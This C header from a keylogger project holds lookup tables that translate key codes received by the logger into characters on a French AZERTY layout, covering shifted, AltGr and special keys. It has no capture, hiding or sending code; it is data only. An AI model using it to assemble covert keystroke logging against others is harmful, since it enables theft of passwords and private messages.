/***********************************************************************
* FILENAME :  keymaps.h
*
* DESCRIPTION :
*       Declaration des structures qui correspond a la liaison entre les
*       valeurs des touches recu par le keylogger et ce que represente
*       la valeur en ascii
*
* AUTHOR :    Yanis GENY          START DATE :    26 Jan 2024
************************************************************************/

#ifndef __KEYMAPS_H_
#define __KEYMAPS_H_

struct keymaps_t origin_keyboard = {
	"origin.keyboard",
	{
		{  4, "q"            }, {  5, "b"            }, {  6, "c"            },
		{  7, "d"            }, {  8, "e"            }, {  9, "f"            },
		{ 10, "g"            }, { 11, "h"            }, { 12, "i"            },
		{ 13, "j"            }, { 14, "k"            }, { 15, "l"            },
		{ 16, ","            }, { 17, "n"            }, { 18, "o"            },
		{ 19, "p"            }, { 20, "a"            }, { 21, "r"            },
		{ 22, "s"            }, { 23, "t"            }, { 24, "u"            },
		{ 25, "v"            }, { 26, "z"            }, { 27, "x"            },
		{ 28, "y"            }, { 29, "w"            }, { 30, "&"            },
		{ 31, "é"            }, { 32, "\""           }, { 33, "'"            },
		{ 34, "("            }, { 35, "-"            }, { 36, "è"            },
		{ 37, "_"            }, { 38, "ç"            }, { 39, "à"            },
		{ 44, " "            }, { 45, ")"            }, { 46, "="            },
		{ 47, "^"            }, { 48, "$"            }, { 50, "*"            },
		{ 51, "m"            }, { 52, "ù"            }, { 53, "œ"            },
		{ 54, ";"            }, { 55, ":"            }, { 56, "!"            },
		{ 84, "/"            }, { 85, "*"            }, { 86, "-"            },
		{ 87, "+"            }, { 89, "1"            }, { 90, "2"            },
		{ 91, "3"            }, { 92, "4"            }, { 93, "5"            },
		{ 94, "6"            }, { 95, "7"            }, { 96, "8"            },
		{ 97, "9"            }, { 98, "0"            }, {100, "<"            },
		{ 99, "."            }, {  0, ""             }
	}
};

struct keymaps_t maj_keyboard = {
	"maj.keyboard",
	{
		{  4, "Q"            }, {  5, "B"            }, {  6, "C"            },
		{  7, "D"            }, {  8, "E"            }, {  9, "F"            },
		{ 10, "G"            }, { 11, "H"            }, { 12, "I"            },
		{ 13, "J"            }, { 14, "K"            }, { 15, "L"            },
		{ 16, "?"            }, { 17, "N"            }, { 18, "O"            },
		{ 19, "P"            }, { 20, "A"            }, { 21, "R"            },
		{ 22, "S"            }, { 23, "T"            }, { 24, "U"            },
		{ 25, "V"            }, { 26, "Z"            }, { 27, "X"            },
		{ 28, "Y"            }, { 29, "W"            }, { 30, "1"            },
		{ 31, "2"            }, { 32, "3"            }, { 33, "4"            },
		{ 34, "5"            }, { 35, "6"            }, { 36, "7"            },
		{ 37, "8"            }, { 38, "9"            }, { 39, "0"            },
		{ 44, " "            }, { 45, "°"            }, { 46, "+"            },
		{ 47, "¨"            }, { 48, "£"            }, { 50, "μ"            },
		{ 51, "M"            }, { 52, "%"            }, { 53, "Œ"            },
		{ 54, "."            }, { 55, "/"            }, { 56, "§"            },
		{ 84, "/"            }, { 85, "*"            }, { 86, "-"            },
		{ 87, "+"            }, { 89, "1"            }, { 90, "2"            },
		{ 91, "3"            }, { 92, "4"            }, { 93, "5"            },
		{ 94, "6"            }, { 95, "7"            }, { 96, "8"            },
		{ 97, "9"            }, { 98, "0"            }, {100, ">"            },
		{  0, ""             }
	}
};

struct keymaps_t altgr_keyboard = {
	"altgr.keyboard",
	{
		{  4, "Â"            }, {  5, "ß"            }, {  6, "©"            },
		{  7, "Ê"            }, {  8, "€"            }, {  9, "±"            },
		{ 10, "æ"            }, { 11, "ð"            }, { 12, "î"            },
		{ 13, "Û"            }, { 14, "Î"            }, { 15, "Ô"            },
		{ 16, "¿"            }, { 17, "¬"            }, { 18, "ô"            },
		{ 19, "¶"            }, { 20, "â"            }, { 21, "ç"            },
		{ 22, "ø"            }, { 23, "þ"            }, { 24, "û"            },
		{ 25, "®"            }, { 26, "å"            }, { 27, "»"            },
		{ 28, "ý"            }, { 29, "«"            }, { 30, "´"            },
		{ 31, "~"            }, { 32, "#"            }, { 33, "{"            },
		{ 34, "["            }, { 35, "|"            }, { 36, "`"            },
		{ 37, "\\"           }, { 38, "^"            }, { 39, "@"            },
		{ 44, " "            }, { 45, "]"            }, { 46, "}"            },
		{ 47, "~"            }, { 48, "ê"            }, { 50, "³"            },
		{ 51, "¹"            }, { 52, "²"            }, { 53, "|"            },
		{ 54, "×"            }, { 55, "÷"            }, { 56, "¡"            },
		{ 84, "/"            }, { 85, "*"            }, { 86, "-"            },
		{ 87, "+"            }, { 89, "1"            }, { 90, "2"            },
		{ 91, "3"            }, { 92, "4"            }, { 93, "5"            },
		{ 94, "6"            }, { 95, "7"            }, { 96, "8"            },
		{ 97, "9"            }, { 98, "0"            }, {100, "|"            },
		{  0, ""             }
	}
};

struct keymaps_t unchange_keyboard = {
	"unchange.keyboard",
	{
		{ 83, "<VER_NUM>"    }, { 82, "<UP-ARROW>"   }, { 81, "<DOWN-ARROW>" },
		{ 80, "<LEFT-ARROW>" }, { 79, "<RIGHT-ARROW>"}, { 78, "<DOWN>"       },
		{ 77, "<FIN>"        }, { 76, "<SUPPR>"      }, { 75, "<UP>"         },
		{ 74, "<ARRET_DEFIL>"}, { 57, "<MAJ>"        }, { 58, "<F1>"         },
		{ 59, "<F2>"         }, { 60, "<F3>"         }, { 61, "<F4>"         },
		{ 62, "<F5>"         }, { 63, "<F6>"         }, { 64, "<F7>"         },
		{ 65, "<F8>"         }, { 66, "<F9>"         }, { 67, "<F10>"        },
		{ 68, "<F11>"        }, { 69, "<F12>"        }, { 73, "<INSERT>"     },
		{ 41, "<ESC>"        }, { 42, "<DEL>"        }, { 43, "<TAB>"        },
		{101, "<GUI>"        }, { 40, "\n"           }, { 88, "\n"           },
		{  0, ""             }
	}
};

struct keymaps_t speudokeylog_keyboard = {
	"speudokeylog.unchange.keyboard",
	{
		{ 83, "<VER_NUM>"    }, { 82, "<UP-ARROW>"   }, { 81, "<DOWN-ARROW>" },
		{ 80, "<LEFT-ARROW>" }, { 79, "<RIGHT-ARROW>"}, { 78, "<DOWN>"       },
		{ 77, "<FIN>"        }, { 76, "<SUPPR>"      }, { 75, "<UP>"         },
		{ 74, "<ARRET_DEFIL>"}, { 57, "<MAJ>"        }, { 58, "<F1>"         },
		{ 59, "<F2>"         }, { 60, "<F3>"         }, { 61, "<F4>"         },
		{ 62, "<F5>"         }, { 63, "<F6>"         }, { 64, "<F7>"         },
		{ 65, "<F8>"         }, { 66, "<F9>"         }, { 67, "<F10>"        },
		{ 68, "<F11>"        }, { 69, "<F12>"        }, { 73, "<INSERT>"     },
		{ 41, "<ESC>"        }, { 42, "<DEL>"        }, { 43, "<TAB>"        },
		{101, "<GUI>"        }, { 40, "<NEW_LINE>"   }, { 88, "<NEW_LINE>"   },
		{  0, ""             }
	}
};

#endif